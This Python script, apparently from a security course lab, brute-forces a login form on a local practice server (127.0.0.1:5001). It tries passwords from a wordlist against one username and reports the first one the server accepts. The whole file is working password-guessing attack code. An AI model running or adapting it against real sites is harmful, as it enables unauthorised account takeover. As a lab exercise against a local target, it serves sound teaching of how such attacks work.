import time
import requests
from pathlib import Path

TARGET = "http://127.0.0.1:5001/login"
WORDLIST_FILE = Path(__file__).parent.parent / "wordlists" / "small.txt"
USERNAME_FILE = Path(__file__).parent.parent / "wordlists" / "username.txt"

def load_first_line(p: Path, default="student"):
    try:
        return p.read_text(encoding="utf-8").splitlines()[0].strip()
    except Exception:
        return default

def load_list(p: Path):
    try:
        return [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines() if ln.strip()]
    except Exception:
        return ["husky123","password","123456"]

def try_passwords(username, passwords):
    for pw in passwords:
        data = {"username": username, "password": pw}
        try:
            r = requests.post(TARGET, data=data, timeout=3)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return None
        # Original lab logic often checked for presence/absence of "Wrong username"
        if "Wrong username" not in r.text:
            print(f"✔ Correct login: {username}:{pw}")
            return pw
        time.sleep(0.05)
    print("✘ No match found in this list.")
    return None

if __name__ == "__main__":
    user = load_first_line(USERNAME_FILE)
    pw_list = load_list(WORDLIST_FILE)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Trying {len(pw_list)} passwords for user '{user}' ...")
    try_passwords(user, pw_list)
